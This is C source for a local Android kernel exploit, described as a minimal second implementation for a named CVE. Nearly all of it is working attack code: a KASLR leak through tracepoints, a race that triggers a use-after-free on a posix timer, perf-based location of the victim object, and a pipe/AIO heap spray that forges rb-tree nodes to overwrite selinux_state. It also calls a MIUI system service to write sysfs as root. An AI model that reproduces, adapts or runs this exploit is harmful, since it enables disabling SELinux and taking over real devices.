/*
 * CVE-2026-98260 Stage A —— 极简实现（第二份独立代码）
 *
 * 背景：pwn.c 经过几十轮迭代，积累了 6 个资源生命周期 bug。
 *       本文件从**已被证明有效**的 trigger.c（第 38 轮实测 kernel_panic）出发，
 *       只加三件事：KASLR 泄漏、pipe 喷射、reap。
 *       目的是用一个更小的实现交叉验证 —— 如果它能中而 pwn.c 不中，
 *       说明 pwn.c 里还有影响结果的 bug。
 *
 * 用法：pwn_min [phase] [npipes] [pages_per_pipe]
 *   phase          0 / 8 / 16
 *   npipes         管道数（默认 512）
 *   pages_per_pipe 每条管道的页数（默认 0 = 按内存自动）
 *
 * 成功判据：设备 kernel_panic（写中 selinux_state 时若值不为 0 会崩；
 *           value=0 时是零写，命中后 getenforce 会变 Permissive）
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PAGE 4096UL
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define HELPER_STACK (1 << 20)
#define LOCKERS 3

#define KIMAGE_STATIC 0xffffffc080000000ULL
#define SELINUX_STATE_STATIC 0xffffffc08236a2e0ULL

#define MAX_PIPES 8192

/* ---- KASLR：三组已标定的 (符号, 函数内偏移) ---- */
static const struct { uint64_t sym, off; } KP[] = {
	{ 0xffffffc0800d98c0ULL, 0x09c }, /* worker_thread        */
	{ 0xffffffc08016ab44ULL, 0x1e4 }, /* rcu_gp_fqs_loop      */
	{ 0xffffffc08016a030ULL, 0x0c4 }, /* rcu_gp_kthread       */
	{ 0xffffffc08095f5c8ULL, 0x010 }, /* regmap_lock_mutex    */
	{ 0xffffffc0802cfa14ULL, 0x2b4 }, /* folio_wait_bit_common*/
	{ 0xffffffc0805c7040ULL, 0x090 }, /* f2fs_wait_on_all_pages*/
	{ 0xffffffc080188280ULL, 0x02c }, /* msleep               */
	{ 0xffffffc080161830ULL, 0x4f0 }, /* synchronize_rcu_expedited */
};
#define NKP (sizeof(KP) / sizeof(KP[0]))

static volatile int *g_shmtid;   /* fork 前 mmap(MAP_SHARED)：子进程写 exec 线程 tid */
static size_t g_vma_count = 50000;
static void *g_frag_base;
static size_t g_frag_len;
static atomic_int g_go, g_stop, g_locker_cpu, g_locker_started;
static atomic_int g_exec_tid, g_target_tgid;

static unsigned g_phase;
static int g_dry;   /* 只做 KASLR + 喷射 + 自检，不触发 UAF（零风险）*/
static int g_npipes = 512;
static int g_ppp;

static int g_pipes[MAX_PIPES * 2];
static int g_np;

static void logf(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
	fflush(stdout);
}

static void pin(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof(s), &s);
}

static int wr_file(const char *p, const char *v)
{
	int fd = open(p, O_WRONLY);
	ssize_t r;

	if (fd < 0)
		return -1;
	r = write(fd, v, strlen(v));
	close(fd);
	return r < 0 ? -1 : 0;
}

static long mem_free_kb(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char line[256];
	long avail = -1, freev = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		if (avail < 0 && sscanf(line, "MemAvailable: %ld kB", &avail) == 1)
			continue;
		if (freev < 0 && sscanf(line, "MemFree: %ld kB", &freev) == 1)
			continue;
		if (avail >= 0 && freev >= 0)
			break;
	}
	fclose(f);
	/* MemFree 在 Android 上长期只有几十 MB（大部分内存在 page cache 里），
	 * 用它算预算会把喷射量压到只有 1/20。MemAvailable 才是可回收的实际额度。 */
	return avail > 0 ? avail : freev;
}

/* ================= KASLR ================= */
static uint64_t g_addr[256];
static int g_na;

static void collect(const unsigned char *buf, size_t len)
{
	size_t off = 0;

	while (off + 16 < len && g_na < 256) {
		uint64_t commit;
		size_t pos;

		memcpy(&commit, buf + off + 8, 8);
		pos = off + 16;
		if (commit > 4096 || pos + commit > len)
			break;
		while (pos + 4 <= off + 16 + commit) {
			uint32_t hdr, tl, el;
			const unsigned char *ev;
			uint16_t et;

			memcpy(&hdr, buf + pos, 4);
			tl = hdr & 0x1f;
			if (tl == 30 || tl == 31) { pos += 4; continue; }
			if (tl == 0) {
				if (pos + 8 > len) break;
				memcpy(&el, buf + pos + 4, 4);
				ev = buf + pos + 8;
				el = (el + 3) & ~3u;
				pos += 8;
			} else {
				el = tl * 4;
				ev = buf + pos + 4;
				pos += el;
			}
			if (el < 24)
				continue;
			memcpy(&et, ev, 2);
			if (et == 109) {
				uint64_t c;

				memcpy(&c, ev + 16, 8);
				if ((c >> 40) == 0xffffff && g_na < 256)
					g_addr[g_na++] = c;
			}
		}
		off += 4096;
	}
}

static uint64_t leak_kaslr(void)
{
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	static unsigned char buf[1 << 20];
	int fds[16], nfd = 0;
	int p[2];

	g_na = 0;
	if (wr_file("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "1") < 0)
		return 0;
	wr_file("/sys/kernel/tracing/tracing_on", "1");
	if (pipe(p) == 0) {
		for (int i = 0; i < 24; i++)
			if (fork() == 0) {
				char b;

				close(p[1]);
				read(p[0], &b, 1);
				_exit(0);
			}
	}
	usleep(700000);
	for (int c = 0; c < ncpu && c < 16; c++) {
		char path[128];
		int fd;

		snprintf(path, sizeof(path),
			 "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", c);
		fd = open(path, O_RDONLY | O_NONBLOCK);
		if (fd >= 0)
			fds[nfd++] = fd;
	}
	for (int r = 0; r < 8 && g_na < 12; r++) {
		for (int i = 0; i < nfd; i++) {
			ssize_t n = read(fds[i], buf, sizeof(buf));

			if (n > 0)
				collect(buf, (size_t)n);
		}
		if (g_na >= 4)
			break;
		usleep(250000);
	}
	for (int i = 0; i < nfd; i++)
		close(fds[i]);
	wr_file("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "0");

	/* 去重 */
	{
		int w = 0;

		for (int i = 0; i < g_na; i++) {
			int dup = 0;

			for (int j = 0; j < w; j++)
				if (g_addr[j] == g_addr[i]) { dup = 1; break; }
			if (!dup)
				g_addr[w++] = g_addr[i];
		}
		g_na = w;
	}
	logf("  去重后 %d 个地址\n", g_na);
	for (int i = 0; i < g_na && i < 8; i++)
		logf("    [RAW] addr[%d] = 0x%llx\n", i, (unsigned long long)g_addr[i]);

	uint64_t cand[256 * NKP];
	int nc = 0;

	for (int i = 0; i < g_na; i++)
		for (unsigned h = 0; h < NKP; h++) {
			uint64_t b = g_addr[i] - (KP[h].sym - KIMAGE_STATIC) - KP[h].off;

			if ((b >> 40) == 0xffffff && (b & 0x7ffff) == 0)
				cand[nc++] = b;
		}
	uint64_t best = 0;
	int bn = 0;

	for (int i = 0; i < nc; i++) {
		int n = 0;

		for (int j = 0; j < nc; j++)
			if (cand[j] == cand[i])
				n++;
		if (n > bn) { bn = n; best = cand[i]; }
	}
	if (bn < 2 || !best)
		return 0;
	logf("  KASLR base=0x%llx（%d 票）\n", (unsigned long long)best, bn);
	return best;
}

/* ================= 触发（照搬第 38 轮已验证的 trigger.c） ============ */
static int prepare_fragmented_range(void)
{
	size_t len = g_vma_count * PAGE;
	int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
	void *base;

	if (fd < 0 || ftruncate(fd, PAGE))
		return -1;
	base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (unsigned long i = 0; i < g_vma_count; i++) {
		void *want = (char *)base + i * PAGE;

		if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
			return -1;
	}
	close(fd);
	g_frag_base = base;
	g_frag_len = len;
	return 0;
}

static int locker_fn(void *x)
{
	int prot = PROT_NONE;
	unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);

	(void)x;
	pin(slot ? 3 : 1);
	while (!atomic_load(&g_go))
		sched_yield();
	atomic_fetch_add(&g_locker_started, 1);
	while (!atomic_load(&g_stop)) {
		syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	_exit(0);
}

static int killer_fn(void *x)
{
	int tid, tgid;

	(void)x;
	pin(2);
	while (!(tid = atomic_load(&g_exec_tid)))
		sched_yield();
	tgid = atomic_load(&g_target_tgid);
	for (;;) {
		long r = syscall(SYS_tgkill, tgid, tid, 0);

		if (r < 0 && errno == ESRCH)
			break;
		sched_yield();
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	atomic_store(&g_stop, 1);
	_exit(0);
}

static int spawn_vm_helper(int (*fn)(void *))
{
	void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	int p;

	if (st == MAP_FAILED)
		return -1;
	p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
	if (p < 0)
		munmap(st, HELPER_STACK);
	return p;
}

static void *exec_thread(void *x)
{
	struct sigevent ev_none, ev_victim;
	struct itimerspec dormant;
	char *const argv[] = { (char *)"", NULL };
	char *const envp[] = { NULL };

	(void)x;
	pin(2);
	prctl(PR_SET_NAME, "yexec", 0, 0, 0);
	memset(&ev_none, 0, sizeof(ev_none));
	ev_none.sigev_notify = SIGEV_NONE;
	memset(&ev_victim, 0, sizeof(ev_victim));
	ev_victim.sigev_notify = SIGEV_SIGNAL;
	ev_victim.sigev_signo = SIGRTMIN;
	memset(&dormant, 0, sizeof(dormant));
	dormant.it_value.tv_sec = 3600;
	for (int i = 0; i < NTIMERS; i++) {
		timer_t t;
		struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;

		if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
			_exit(120);
		if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
			_exit(121);
	}
	atomic_store(&g_exec_tid, (int)syscall(SYS_gettid));
	if (g_shmtid)
		g_shmtid[0] = (int)syscall(SYS_gettid);
	atomic_store(&g_go, 1);
	while (atomic_load(&g_locker_started) < LOCKERS)
		sched_yield();
	for (volatile unsigned long i = 0; i < 5000000UL; i++)
		__asm__ volatile("" ::: "memory");
	execve("/proc/self/exe", argv, envp);
	_exit(123);
}

static void run_target(void)
{
	pthread_t th;
	sigset_t set;

	atomic_store(&g_target_tgid, (int)getpid());
	pin(2);
	if (prepare_fragmented_range())
		_exit(110);
	for (int i = 0; i < LOCKERS; i++)
		if (spawn_vm_helper(locker_fn) < 0)
			_exit(111);
	if (spawn_vm_helper(killer_fn) < 0)
		_exit(112);
	sigemptyset(&set);
	sigaddset(&set, SIGRTMIN);
	pthread_sigmask(SIG_BLOCK, &set, NULL);
	if (pthread_create(&th, NULL, exec_thread, NULL))
		_exit(114);
	for (;;)
		sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
	struct timespec pause = { .tv_nsec = 200000 };

	for (int i = 0; i < 25000; i++) {
		memset(si, 0, sizeof(*si));
		if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (si->si_pid == pid)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

/* ================= perf：拿受害 k_itimer 的真实地址 =================
 *
 * 参考实现（WantenMN/cve-2026-98260-adb）的关键技巧：
 *   从 kmem_cache_alloc 的 tracepoint 里直接读出受害对象的内核虚拟地址，
 *   于是 node_off = (victim + 0x78) & 0xfff 是**精确值**，
 *   不需要「相位 0/8/16 猜三次」。
 *
 * 本机 k_itimer 的 bytes_req = 264（posix_timers_cache 的 object_size），
 * call_site 由运行时统计得出（do_timer_create 里那条 bl 的返回地址）。
 */

/* ================= 精确落点：用 perf 抓受害 k_itimer 的真实地址 =================
 *
 * 相位猜测（0/8/16）之所以只有 2/3 命中、还会崩，是因为不知道对象在页内的确切偏移。
 * 公开实现（WantenMN/cve-2026-98260-adb）的做法是：先从 tracepoint 拿到 k_itimer
 * 的真实内核地址，再算 node_off = (addr + 0x78) & 0xfff，于是相位 100% 确定。
 *
 * 这里用同样的办法：监听 kmem:kmem_cache_alloc，过滤
 *   bytes_req == 264（sizeof(struct k_itimer)）且
 *   call_site ∈ do_timer_create 函数体
 * 按分配顺序取第 VICTIM_IDX 个，就是受害 timer 的地址。
 */
#define P_MAXR 16
#define P_RINGPAGES 64

struct p_ring {
	int fd;
	struct perf_event_mmap_page *meta;
	unsigned char *data;
	size_t dsize;
	uint64_t tail;
};

static struct p_ring g_pr[P_MAXR];
static int g_pnr;
static int g_po_ptr, g_po_br, g_po_cs;
static uint64_t g_cs_lo, g_cs_hi;

static int p_read_int(const char *p)
{
	FILE *f = fopen(p, "r");
	int v = -1;

	if (f) {
		if (fscanf(f, "%d", &v) != 1)
			v = -1;
		fclose(f);
	}
	return v;
}

static int p_field_off(const char *fmt, const char *name)
{
	FILE *f = fopen(fmt, "r");
	char line[512];
	int off = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, name) && strstr(line, "offset:")) {
			char *o = strstr(line, "offset:");

			off = atoi(o + 7);
			break;
		}
	}
	fclose(f);
	return off;
}

static int perf_start(uint64_t base)
{
	const char *tp = "/sys/kernel/tracing/events/kmem/kmem_cache_alloc";
	char path[256];
	int tp_id;
	size_t pg = (size_t)sysconf(_SC_PAGESIZE);

	snprintf(path, sizeof(path), "%s/id", tp);
	tp_id = p_read_int(path);
	snprintf(path, sizeof(path), "%s/format", tp);
	g_po_ptr = p_field_off(path, "ptr");
	g_po_br = p_field_off(path, "bytes_req");
	g_po_cs = p_field_off(path, "call_site");
	if (tp_id < 0 || g_po_ptr < 0 || g_po_br < 0 || g_po_cs < 0)
		return -1;
	g_cs_lo = base + (0x195ca0ULL);          /* do_timer_create - KIMAGE */
	g_cs_hi = g_cs_lo + 0x50cULL;

	for (int c = 0; c < P_MAXR; c++) {
		struct perf_event_attr attr;
		int fd;
		void *b;

		memset(&attr, 0, sizeof(attr));
		attr.type = PERF_TYPE_TRACEPOINT;
		attr.size = sizeof(attr);
		attr.config = (uint64_t)tp_id;
		attr.sample_period = 1;
		attr.sample_type = PERF_SAMPLE_RAW | PERF_SAMPLE_TID;
		attr.wakeup_events = 1;
		fd = (int)syscall(__NR_perf_event_open, &attr, -1, c, -1, 0);
		if (fd < 0)
			continue;
		b = mmap(NULL, pg * (P_RINGPAGES + 1), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
		if (b == MAP_FAILED) {
			close(fd);
			continue;
		}
		g_pr[g_pnr].fd = fd;
		g_pr[g_pnr].meta = b;
		g_pr[g_pnr].data = (unsigned char *)b + pg;
		g_pr[g_pnr].dsize = pg * P_RINGPAGES;
		g_pr[g_pnr].tail = 0;
		ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
		g_pnr++;
	}
	return g_pnr > 0 ? 0 : -1;
}

/* 排空所有环，把命中的 k_itimer 地址按出现顺序追加到 out[]，返回总条数 */
static int perf_drain(uint64_t *out, int *cpid_out, int max, int *n, int want_tid)
{
	for (int i = 0; i < g_pnr; i++) {
		struct p_ring *r = &g_pr[i];
		uint64_t head = r->meta->data_head;

		__sync_synchronize();
		while (r->tail < head) {
			struct perf_event_header *h = (void *)(r->data + (r->tail % r->dsize));

			if (h->size == 0 || h->size > r->dsize)
				break;
			if (h->type == PERF_RECORD_SAMPLE) {
				unsigned char *rec = (unsigned char *)h;
				size_t pos = sizeof(*h);
				uint32_t rawsz = 0;

				if (pos + 8 <= h->size)
					pos += 8;
				if (pos + 4 <= h->size) {
					memcpy(&rawsz, rec + pos, 4);
					pos += 4;
					if (pos + rawsz <= h->size &&
					    (size_t)g_po_cs + 8 <= rawsz &&
					    (size_t)g_po_br + 8 <= rawsz &&
					    (size_t)g_po_ptr + 8 <= rawsz) {
						uint64_t br, ptr, cs;

						memcpy(&br, rec + pos + g_po_br, 8);
						memcpy(&ptr, rec + pos + g_po_ptr, 8);
						memcpy(&cs, rec + pos + g_po_cs, 8);
						int cpid = 0;

						if (rawsz >= 8)
							memcpy(&cpid, rec + pos + 4, 4);
						static int dbg_n = 0;

						if (br == 264 && cs >= g_cs_lo && cs < g_cs_hi && dbg_n < 6) {
							logf("    [dbg] ptr=0x%llx cpid=%d want=%d\\n",
							     (unsigned long long)ptr, cpid, want_tid);
							dbg_n++;
						}
						if (br == 264 && ptr && cs >= g_cs_lo &&
						    cs < g_cs_hi && *n < max &&
						    (want_tid <= 0 || cpid == want_tid)) {
							out[*n] = ptr;
							cpid_out[*n] = cpid;
							(*n)++;
						}
					}
				}
			}
			r->tail += h->size;
		}
		r->meta->data_tail = r->tail;
	}
	return *n;
}

static void perf_stop(void)
{
	for (int i = 0; i < g_pnr; i++)
		close(g_pr[i].fd);
	g_pnr = 0;
}

/* ================= 喷射 =================
 *
 * 两种 order-0、UNMOVABLE、内容可写的载体：
 *   A. pipe 页   —— 受 /proc/sys/fs/pipe-user-pages-soft 限制（实测只能 40 MB）
 *   B. AIO ring  —— io_setup() 每页一次 find_or_create_page(GFP_USER|__GFP_ZERO)，
 *                   order-0、UNMOVABLE、用户态可直接写，无 per-user 限额
 *                   （本机实测 60000 个上下文 = 234 MB，零失败）
 *
 * 两者都按「偶数页相位 0、奇数页相位 8」铺设：
 *   8 KB slab 的前半页需要相位 0、后半页需要相位 8。
 */
#define NR_IO_SETUP 0
#define MAX_AIO 200000

static unsigned long g_aio[MAX_AIO];
static int g_naio;
static int g_carrier_aio;
static int g_poison;
static int g_probe;   /* 把 target 换成必然未映射的地址：命中必 panic，用来判定相位 */
static int g_same;
static int g_noperf;
static uint64_t g_value = 0;   /* 要写的值：0 / 1 / 2 / 3 都是良性（parent=0）*/
static long g_v_off = -1;   /* >=0：精确页内偏移（perf 拿到 k_itimer 地址后自动设置）*/
static uint64_t g_tgt;   /* tgt=0x... 显式指定写入地址（阶段 C 用）*/    /* 所有页用同一相位（不交替 0/8）*/   /* 整页填 0xde：命中必 panic，用来判定「页到底是不是我们的」*/

static void build_page(unsigned char *pg, uint64_t target, unsigned phase)
{
	if (g_poison) {
		memset(pg, 0xde, PAGE);
		return;
	}
	memset(pg, 0, PAGE);
	/* 精确落点：V 已知（perf 拿到的 k_itimer 页内偏移），只在 V+0x78 写三元组。
	 * 这样无论我们拿到 slab 的哪一半、也无论 SLUB freelist 怎么随机，
	 * 页内偏移都是确定的 —— 不需要再猜相位。 */
	if (g_v_off >= 0) {
		size_t n = (size_t)g_v_off + 0x78;

		if (n + 24 <= PAGE) {
			*(uint64_t *)(pg + n + 0) = g_value;
			*(uint64_t *)(pg + n + 8) = 0;
			*(uint64_t *)(pg + n + 16) = target;
		}
		return;
	}
	{
		unsigned ph = (unsigned)((g_same ? g_phase : phase) % 24u);

		for (size_t off = ph; off + 24 <= PAGE; off += 24) {
			*(uint64_t *)(pg + off + 0) = g_value; /* rb_parent_color */
			*(uint64_t *)(pg + off + 8) = 0;       /* rb_right        */
			*(uint64_t *)(pg + off + 16) = target; /* rb_left = target*/
		}
	}
}

static int aio_spray(uint64_t target, int nctx)
{
	unsigned char pg[PAGE];
	int ok = 0;

	for (int i = 0; i < nctx && g_naio < MAX_AIO; i++) {
		unsigned long c = 0;

		if (syscall(NR_IO_SETUP, 1UL, &c) < 0)
			break;
		build_page(pg, target, g_phase + ((i & 1) ? 8u : 0u));   /* g_same 时会以 g_phase 为准 */
		memcpy((void *)(uintptr_t)c, pg, PAGE);
		g_aio[g_naio++] = c;
		ok++;
	}
	return ok;
}

static int spray(uint64_t target, int npipes, int ppp)
{
	size_t bufsz = PAGE * (size_t)ppp;
	unsigned char *pl = malloc(bufsz);
	int ok = 0;

	if (g_carrier_aio)
		return aio_spray(target, npipes);

	if (!pl)
		return 0;
	/* 关键：8 KB slab 拆成两个 4 KB 页后，
	 *   前半页（slab 内 0x0000-0x0FFF）需要页内相位 0
	 *   后半页（slab 内 0x1000-0x1FFF）需要页内相位 8
	 * （已经离线验证：两半各 15 个完整对象，分别只需相位 0 与 8）
	 * 而 buddy 拆 order-1 块时会把两半依次交给我们，
	 * 所以只要**逐页交替 0 / 8**，两半就都能被正确覆盖。
	 * 之前是整段连续铺，页内相位会按 4096 mod 24 = 16 乱跳（0/16/8 循环），
	 * 只有 1/3 的页恰好对齐。 */
	for (size_t pi = 0; pi * PAGE + PAGE <= bufsz; pi++) {
		unsigned char *pg = pl + pi * PAGE;
		unsigned ph = (unsigned)((g_phase + ((pi & 1) ? 8u : 0u)) % 24u);

		memset(pg, 0, PAGE);
		for (size_t off = ph; off + 24 <= PAGE; off += 24) {
			*(uint64_t *)(pg + off + 0) = 0;      /* rb_parent_color */
			*(uint64_t *)(pg + off + 8) = 0;      /* rb_right        */
			*(uint64_t *)(pg + off + 16) = target;/* rb_left = target*/
		}
	}
	/* 运行时自检：逐页统计 target 出现次数与首个偏移。
	 * 期望：偶数页首个 target 在 (phase+16)，奇数页在 (phase+8+16) mod 24。 */
	{
		int pages_checked = 0;

		for (size_t pi = 0; pi * PAGE + PAGE <= bufsz && pages_checked < 2; pi++, pages_checked++) {
			unsigned char *pg = pl + pi * PAGE;
			int cnt = 0;
			size_t first = (size_t)-1;
			unsigned want = (unsigned)((g_phase + ((pi & 1) ? 8u : 0u) + 16u) % 24u);

			for (size_t o = 0; o + 8 <= PAGE; o += 8) {
				uint64_t tv;

				memcpy(&tv, pg + o, 8);
				if (tv == target) {
					if (first == (size_t)-1)
						first = o;
					cnt++;
				}
			}
			/* 机器读取的行一律 ASCII：adb shell 输出会按控制台编码解码，
			 * 中文在计划任务/不同区域设置下会变乱码，导致上层正则静默失效。 */
			logf("  [SELFCHECK] page=%zu cnt=%d first=%zu want=%u got=%zu %s\n",
			     pi, cnt, first, want, first % 24,
			     (first % 24 == want) ? "OK" : "MISMATCH");
		}
	}
	for (int i = 0; i < npipes && g_np < MAX_PIPES; i++) {
		int pfd[2], cap;

		if (pipe(pfd) < 0)
			break;
		(void)fcntl(pfd[1], F_SETPIPE_SZ, (int)bufsz);
		cap = (int)fcntl(pfd[1], F_GETPIPE_SZ);
		(void)fcntl(pfd[1], F_SETFL, O_NONBLOCK);
		if (cap < (int)bufsz ||
		    write(pfd[1], pl, bufsz) != (ssize_t)bufsz) {
			close(pfd[0]);
			close(pfd[1]);
			break;
		}
		g_pipes[g_np * 2] = pfd[0];
		g_pipes[g_np * 2 + 1] = pfd[1];
		g_np++;
		ok += ppp;
	}
	free(pl);
	return ok;
}

/* 通过 mqsas writeToPersistFile(方法7) 以 root 身份写 sysfs，触发 slab shrink */
static void mq_shrink(void)
{
	int r = system("/system/bin/service call miui.mqsas.IMQSNative 7 "
		       "s16 \"/sys/kernel/slab/posix_timers_cache/shrink\" s16 \"1\" "
		       ">/dev/null 2>&1");

	logf("  [shrink] posix_timers_cache rc=%d\n", r);
}

int main(int argc, char **argv)
{
	struct rlimit rl;

	setvbuf(stdout, NULL, _IONBF, 0);
	if (argv[0] && argv[0][0] == '\0')
		_exit(42);

	if (argc > 1)
		g_phase = (unsigned)strtoul(argv[1], NULL, 0);
	if (argc > 2)
		g_npipes = atoi(argv[2]);
	g_ppp = (argc > 3) ? atoi(argv[3]) : 0;
	for (int ai = 4; ai < argc; ai++) {
		if (!strcmp(argv[ai], "dry"))
			g_dry = 1;
		else if (!strcmp(argv[ai], "aio"))
			g_carrier_aio = 1;
		else if (!strcmp(argv[ai], "poison"))
			g_poison = 1;
		else if (!strcmp(argv[ai], "probe"))
			g_probe = 1;
		else if (!strcmp(argv[ai], "same"))
			g_same = 1;
		else if (!strcmp(argv[ai], "noperf"))
			g_noperf = 1;
		else if (!strncmp(argv[ai], "val=", 4))
			g_value = strtoull(argv[ai] + 4, NULL, 0);
		else if (!strncmp(argv[ai], "voff=", 5))
			g_v_off = strtol(argv[ai] + 5, NULL, 0);
		else if (!strncmp(argv[ai], "tgt=0x", 6))
			g_tgt = strtoull(argv[ai] + 6, NULL, 16);
	}

	if (!getrlimit(RLIMIT_NOFILE, &rl)) {
		rl.rlim_cur = rl.rlim_max;
		if (rl.rlim_cur > 65536)
			rl.rlim_cur = 65536;
		(void)setrlimit(RLIMIT_NOFILE, &rl);
	}

	pin(2);
	logf("=== pwn_min  phase=%u pipes=%d ppp=%d ===\n", g_phase, g_npipes, g_ppp);

	/* KASLR 偶尔只采到 1~2 个地址、票数不够（实测约 3/4 成功）。
	 * 多试几次：每次都重新 fork 一批阻塞进程、重新采轨迹。 */
	uint64_t base = 0;

	for (int att = 0; att < 6 && !base; att++) {
		if (att)
			logf("  KASLR retry #%d\n", att);
		base = leak_kaslr();
		if (!base)
			usleep(200000);
	}
	if (!base) {
		logf("[!] KASLR 失败（已重试 6 次）\n");
		return 1;
	}
	uint64_t target = base + (SELINUX_STATE_STATIC - KIMAGE_STATIC);

	if (g_tgt) {
		target = g_tgt;
		logf("  [tgt] 显式目标 -> 0x%llx\\n", (unsigned long long)target);
	}
	if (g_probe) {
		/* 未映射地址：只有 node+0x10 真的落到我们铺的 target 槽上才会写到这里 */
		target = 0xdead000000000000ULL;
		logf("  [probe] target -> 0xdead000000000000 (unmapped)\\n");
	}

	logf("[+] 目标 selinux_state = 0x%llx\n", (unsigned long long)target);

	/* 内存预算：总共 2 波 */
	long mf = mem_free_kb();
	long cap = (mf > 0) ? (mf * 1024 / (long)PAGE * 3 / 10 / 2) : 0;

	if (g_ppp <= 0) {
		g_ppp = (cap > 0) ? (int)(cap / g_npipes) : 128;
		if (g_ppp < 1)
			g_ppp = 1;
	}
	logf("  MemFree=%ld kB，ppp=%d，每波 %d 页\n", mf, g_ppp, g_npipes * g_ppp);

	pid_t child = 0;

	/* 需要精确定位受害 timer 时才开 perf（dry / 已指定 voff 时不需要）*/
	int want_addr = (!g_dry && g_v_off < 0 && !g_noperf);

	if (want_addr) {
		if (perf_start(base) == 0)
			logf("  perf 已开（%d 个环），等待 k_itimer 分配…\n", g_pnr);
		else
			logf("  [!] perf 开不了（需要 SELinux Permissive）\n");
	}

	if (!g_dry) {
		if (!g_shmtid)
			g_shmtid = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		if (g_shmtid == MAP_FAILED)
			g_shmtid = NULL;
		child = fork();
		if (child == 0)
			run_target();
		logf("  目标 pid=%d，等僵尸…\n", (int)child);
		if (want_addr && g_pnr > 0) {
			static uint64_t addrs[16384];
			static int cpids[16384];
			int n = 0;

			for (int it = 0; it < 1500 && n < 16000; it++) {
				perf_drain(addrs, cpids, 16384, &n, 0);
				usleep(2000);
			}
			logf("  采到 %d 个 k_itimer 分配\n", n);
			{
				/* 取众数 cpid：只有我们 exec 线程的分配才连续成串，
				 * 其它进程偶尔创建的 POSIX timer 会污染序号，必须剔掉。 */
				int ut[32], uc[32], un = 0, best = -1, bestc = 0;

				for (int i = 0; i < n; i++) {
					int k, f = 0;

					for (k = 0; k < un; k++)
						if (ut[k] == cpids[i]) { uc[k]++; f = 1; break; }
					if (!f && un < 32) { ut[un] = cpids[i]; uc[un] = 1; un++; }
				}
				for (int k = 0; k < un; k++)
					if (uc[k] > bestc) { bestc = uc[k]; best = ut[k]; }
				logf("  众数 cpid=%d（%d 条 / 共 %d 条）\n", best, bestc, n);
				{
					int m2 = 0;
					static uint64_t f2[16384];

					for (int i = 0; i < n; i++)
						if (cpids[i] == best)
							f2[m2++] = addrs[i];
					logf("  过滤后 %d 条\n", m2);
					if (m2 > VICTIM_IDX) {
						uint64_t v = f2[VICTIM_IDX];

						g_v_off = (long)(v & 0xfffUL);
						logf("  ★ victim[%d]=0x%llx -> 精确页内偏移 0x%lx（相位模式已关闭）\n",
						     VICTIM_IDX, (unsigned long long)v, g_v_off);
					} else {
						logf("  [!] 过滤后不够，退回相位模式\n");
					}
				}
			}
		}
		perf_stop();
	} else {
		logf("  [dry] 跳过触发，只验证 KASLR + 喷射 + 自检\n");
	}

	siginfo_t si;

	if (!g_dry) {
		if (wait_zombie(child, &si)) {
			logf("[!] 等僵尸超时\n");
			kill(child, SIGKILL);
			return 2;
		}
		logf("  已是僵尸，喷射\n");
		usleep(300000);
		/* mqsas(root file write) 把本 cache 的空 slab 逼回 buddy，
		 * 否则 SLUB 会把它们留在 per-cpu partial，AIO 页回收不到。 */
		mq_shrink();
		usleep(50000);
	}

	int pages = spray(target, g_npipes, g_ppp);

	usleep(300000);
	pages += spray(target, g_npipes, g_ppp);
	logf("  喷射 %d 页（%d MB）\n", pages, pages * 4 / 1024);
	logf("  [SPRAY] pages=%d mb=%d\n", pages, pages * 4 / 1024);

	if (g_dry) {
		logf("  [dry] 完成：KASLR 与喷射链路均正常，未触发 UAF\n");
		return 0;
	}

	logf("  >>> wait4\n");
	int st = 0;

	(void)wait4(child, &st, 0, NULL);
	logf("  wait4 status=0x%x\n", st);
	if ((st & 0x7f) == 9)
		logf("  [判据] 触发成立\n");
	else if ((st & 0x7f) == 0 && ((st >> 8) & 0xff) == 42)
		logf("  [判据] 触发未成立（exec 成功）\n");
	else
		logf("  [判据] 未知\n");

	logf("  getenforce: ");
	fflush(stdout);
	system("getenforce");
	for (;;)
		pause();
	return 0;
}
